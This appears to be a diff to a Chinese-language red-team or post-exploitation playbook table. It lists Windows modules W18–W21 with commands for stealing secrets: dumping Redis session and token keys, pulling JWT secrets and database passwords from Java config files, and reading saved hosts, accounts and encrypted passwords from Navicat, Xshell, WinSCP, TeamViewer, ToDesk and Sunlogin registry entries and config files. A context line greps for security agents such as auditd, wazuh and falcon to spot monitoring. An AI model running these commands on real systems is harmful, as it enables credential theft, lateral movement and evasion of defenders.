@@ -62,7 +62,7 @@ ps aux | grep -E "auditd|osquery|wazuh|elastic-agent|falcon" | grep -v grep
 | W18 | WSL/Hyper-V `win-wsl` | `wsl -l -v`；`dir C:\Users\*\AppData\Local\Packages\*Ubuntu*` | 开发机常见：WSL 内密钥/历史/SSH 配置 |
 | W19 | Redis 缓存 `win-redis` | `redis-cli -h <ip> ping`（目标本机客户端优先）→ `info keyspace` → `keys "*"` → `get` 会话/令牌键 | 未授权→keyspace→缓存里的库凭据/JWT/会话 |
 | W20 | 应用配置提取 `win-appconfig` | Java：注册表/进程找 jar 路径 → PS 解 jar（`[IO.Compression.ZipFile]::OpenRead`）读 `application*.yml`；`findstr /si /m "password" C:\apps\*.yml *.properties *.xml` | JWT 密钥/多数据源/Druid 控制台/knife4j 端点 |
-| W21 | 客户端凭据 `win-clientcreds` | Navicat：`reg query HKCU\Software\PremiumSoft\Navicat\Servers /s`（主机/用户/加密密码）；Xshell/WinSCP/TeamViewer/todesk 的注册表与 conf 目录 | 每个客户端=一组「主机+账号+密码」→ 直接连 |
+| W21 | 客户端凭据 `win-clientcreds` | Navicat：`reg query HKCU\Software\PremiumSoft\Navicat\Servers /s`（主机/用户/加密密码）；Xshell/WinSCP/TeamViewer/todesk/向日葵(Sunlogin) 的注册表与 conf 目录 | 每个客户端=一组「主机+账号+密码」→ 直接连 |
 
 ## Linux 模块（L1~L14）
 
